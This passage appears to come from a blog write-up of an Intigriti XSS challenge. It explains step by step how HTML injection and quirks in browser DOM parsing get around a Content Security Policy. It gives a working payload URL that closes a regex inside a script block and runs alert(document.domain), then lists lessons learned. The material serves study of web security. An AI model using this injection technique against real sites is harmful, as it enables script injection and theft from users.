+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">  &lt;/div&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">&lt;/ul&gt;` 
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">*/</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>f <span style="color:#555">=</span> i.substring(i.length <span style="color:#555">-</span> <span style="color:#f60">4</span>);
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// returns the string /ul&gt;
+</span></span></span></code></pre></div><p>Seems like the innerHTML of nested <code>ul</code> before the browser closes the missing tag is the rest of the text response until before the <code>&lt;/html&gt;</code> tag.</p>
+<p>The <code>substring(i.length - 4)</code> will take the last 4 characters. In this case it is <code>/ul&gt;</code> and append with <code>e</code> which is <code>)]}'</code> + user input of <code>xss</code> query parameter.</p>
+<p>We can change the nested <code>ul</code> to see how the DOM is rendered after the script element is added (see in developer mode -&gt; Inspector)</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// &lt;ul&gt; will result in /ul&gt;)]}&#39;null
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>
+</span></span><span style="display:flex;"><span>i <span style="color:#555">=</span> <span style="color:#366">document</span>.getElementById(<span style="color:#c30">&#34;body&#34;</span>).children[<span style="color:#366">document</span>.getElementById(<span style="color:#c30">&#34;body&#34;</span>).children.length <span style="color:#555">-</span> <span style="color:#f60">2</span>].lastElementChild.lastElementChild
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// &lt;ul&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// Try to not add &gt; for &lt;ul
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// &lt;ul... wil result in ul&lt;&gt;)]}&#39;null
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>i <span style="color:#555">=</span> ...
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// &lt;ul&lt; div=&#34;&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// Try closing the ) with (
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// &lt;ul( will result l(&lt;&gt;)]}&#39;null
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>i <span style="color:#555">=</span> ...
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// &lt;ul(&lt; div=&#34;&#34;&gt;
+</span></span></span></code></pre></div><p>When we use <code>&lt;ul(</code> the last 4 characters of the innerHTML is <code>l(&lt;&gt;</code>. We see the DOM tries to solve the opening tag <code>&lt;ul(&lt;...</code> to <code>&lt;ul(&lt;&gt;</code> and also resolves the closing tag to be <code>&lt;/ul(&lt;&gt;</code>.</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// l = &lt;li&gt;, l.innerHTML = &lt;ul(
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>i <span style="color:#555">=</span> l.innerHTML.trim()<span style="color:#c30">`&lt;ul(&lt; div=&#34;&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#c30">    &lt;!-- !!! --&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#c30">    &lt;div class=&#34;a&#34;&gt;&#39;&#34;&lt;/div&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#c30">  
+</span></span></span><span style="display:flex;"><span><span style="color:#c30">  &lt;div id=&#34;container&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#c30">      &lt;span&gt;I&lt;/span&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#c30">      &lt;span id=&#34;extra-flicker&#34;&gt;N&lt;/span&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#c30">      &lt;span&gt;T&lt;/span&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#c30">      &lt;span&gt;I&lt;/span&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#c30">      &lt;div id=&#34;broken&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#c30">          &lt;span id=&#34;y&#34;&gt;G&lt;/span&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#c30">      &lt;/div&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#c30">      &lt;span&gt;R&lt;/span&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#c30">      &lt;div id=&#34;broken&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#c30">          &lt;span id=&#34;y&#34;&gt;I&lt;/span&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#c30">      &lt;/div&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#c30">      &lt;span&gt;T&lt;/span&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#c30">      &lt;span&gt;I&lt;/span&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#c30">  &lt;/div&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#c30">
+</span></span></span><span style="display:flex;"><span><span style="color:#c30">&lt;/ul(&lt;&gt;`</span>;
+</span></span></code></pre></div><p>Javascript context is being interpreted by the browser in our HTML injection sink. Also it is worth noting that <code>/.../</code> in JS is a regex.</p>
+<p><img src="e.png" alt="e"></p>
+<p>We can try to complete the arbitrary regex in our HTML injection sink. Since the last 4 characters are obtained from innerHTML and appended before <code>)]}</code>, we need to ensure that the first character of the 4 characters is <code>/</code>. Next we should also close the brackets used in regex as special characters.</p>
+<p>I tried <code>&lt;ul[(&gt;</code> but got <code>l[(&gt;)]}'</code>. This doesn&rsquo;t meet our requirement of ensuring <code>/</code> is the first character since the closing tag is <code>&lt;/ul[(&gt;</code> and the last four characters is <code>l[(&gt;</code>.</p>
+<p>Using <code>&lt;ul[&gt;</code> will result in the closing tag of <code>&lt;/ul[&gt;</code> and last the four characters being <code>ul[&gt;</code>. We may need to use a <code>u</code> instead of <code>ul</code>.</p>
+<p>Using <code>&lt;u[&gt;</code> will result in the closing tag of <code>&lt;/u[&gt;</code> and last the four characters being <code>u[&lt;</code>.</p>
+<p>The null can be controlled with the query parameter <code>&amp;xss=sink</code>. So <code>?html=&lt;/h1&gt;&lt;/div&gt;&lt;ul id-&quot;intigriti&quot;&gt;&lt;li&gt;&lt;u[&gt;&amp;xss=sink</code> will result in</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#309;font-weight:bold">script</span> <span style="color:#309">type</span><span style="color:#555">=</span><span style="color:#c30">&#34;text/javascript&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>  <span style="color:#a00;background-color:#faa">/u[&gt;)]}&#39;sink</span>
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#309;font-weight:bold">script</span>&gt;
+</span></span></code></pre></div><p>We can change the XSS sink to close the regex and end of line for JavaScript before adding XSS JS payload.</p>
+<p><code>?html=&lt;/h1&gt;&lt;/div&gt;&lt;ul id-&quot;intigriti&quot;&gt;&lt;li&gt;&lt;u[&gt;&amp;xss=/;alert(document.domain)</code> will result in the XSS.</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#309;font-weight:bold">script</span> <span style="color:#309">type</span><span style="color:#555">=</span><span style="color:#c30">&#34;text/javascript&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>  <span style="color:#3aa">/u[&gt;)]}&#39;/</span>;
+</span></span><span style="display:flex;"><span>  alert(<span style="color:#366">document</span>.domain);
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#309;font-weight:bold">script</span>&gt;
+</span></span></code></pre></div><h1 id="lessons-learned">Lessons learned</h1>
+<p>Bypassing CSP is possible with HTML injection and DOM manipulation.</p>
+<p>HTML injection cannot override CSP with <code>meta</code> tag when the DOM is already rendered.</p>
+<p>Browsers handle DOM parsing in a quirky manner. Resolving of incomplete tags for closing <code>&gt;</code> or closing tags happen after the event DOMContentLoaded (may differ for browsers, to be confirmed by the browser experts). This is important to take note as we have to consider the state of the DOM of where our attacker control is at.</p>
+<p>A certain combination of HTML elements seems to have a parent-child relationship established by browser during parsing and construction of the DOM tree. For example, <code>ul</code> and <code>li</code>, <code>selector</code> and <code>option</code>. If a custom element is used as a nested element, a parent-child relationship will be established with the parent element.</p>
+
+</article>
+
+                
+    
+    
+        Nicholas Ch • © 2025
+    
+
+
+            </div>
+        </main>
+    </body>
+</html>
